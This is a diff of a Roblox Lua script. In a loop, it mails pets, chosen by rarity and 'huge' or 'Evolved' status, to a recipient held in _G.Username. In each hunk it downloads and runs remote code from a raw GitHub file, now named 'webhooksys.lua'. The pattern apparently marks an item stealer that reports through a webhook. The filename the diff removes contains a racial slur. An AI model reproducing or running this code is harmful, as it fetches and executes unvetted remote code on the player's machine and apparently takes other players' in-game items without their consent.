@@ -276,7 +276,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/webhooksys.lua"))()
             wait(5)
    
             if v2.huge == false or v.r == false then
@@ -319,7 +319,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/webhooksys.lua"))()
             wait(5)
    
             if not string.find(v2.name, "Evolved") then
@@ -361,7 +361,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/webhooksys.lua"))()
             wait(5)
    
             if v2.huge == false or v.g == false then
@@ -404,7 +404,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/webhooksys.lua"))()
             wait(5)   
             if v2.huge == false then
                 break
@@ -542,7 +542,7 @@ while wait() do
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
             print(_G.PetRar)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/webhooksys.lua"))()
 			local args = {
     			[1] = {
         			["Recipient"] = _G.Username,
